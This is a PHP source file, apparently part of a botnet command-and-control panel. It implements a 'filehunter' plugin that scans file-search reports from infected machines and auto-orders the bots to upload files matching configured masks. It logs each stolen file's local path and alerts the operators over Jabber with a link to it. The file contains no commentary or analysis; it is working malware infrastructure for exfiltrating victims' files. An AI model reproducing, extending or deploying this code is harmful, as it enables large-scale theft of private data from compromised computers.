<?php
require_once 'system/lib/report.php';
require_once 'system/lib/global.php';
require_once 'system/lib/shortcuts.php';

/** React on a file
 */
function gate_plugin_filehunter_onfile($botId, $path_src, $path_local){
    mysql_query($q=sprintf(
        'UPDATE `botnet_rep_filehunter` SET `f_local`="%s" WHERE `botId`="%s" AND `f_path`="%s";',
        mysql_real_escape_string($path_local),
        mysql_real_escape_string($botId),
        mysql_real_escape_string(trim($path_src))
    ));
    $aff = mysql_affected_rows();
    GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_TRACE, 'plugin.filehunter', "Updating local path of '$path_src' to '$path_local': rows affected: $aff");

    if ($aff && !empty($GLOBALS['config']['filehunter']['notify_jids'])){
        $url = 'http://'.$_SERVER['HTTP_HOST'].'/'.$path_local;
        jabber_notify($GLOBALS['config']['filehunter']['notify_jids'], "Filehunter: Downloaded from {$botId}:\n{$path_src}\n{$url}\n");
    }
}

/** React on a report
 */
function gate_plugin_filehunter_onreport($botId, $context){
    # Compare each found file against the auto-download masks
    if (!empty($GLOBALS['config']['filehunter']['autodwn'])){
        # Parse
        $report = new Report_FileSearch_Parser($context);
        $wildcard = wildcarts_or($GLOBALS['config']['filehunter']['autodwn']);

        # Compare
        foreach ($report->files as $file)
            if (preg_match($wildcard, $file->name)){
                # Ask FileHunter to download the file
                filehunter_download_file($botId, $file->path, $file->hash);
                GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_TRACE, 'plugin.filehunter', "Auto-download file: {$file->path}");
            }
    }
}
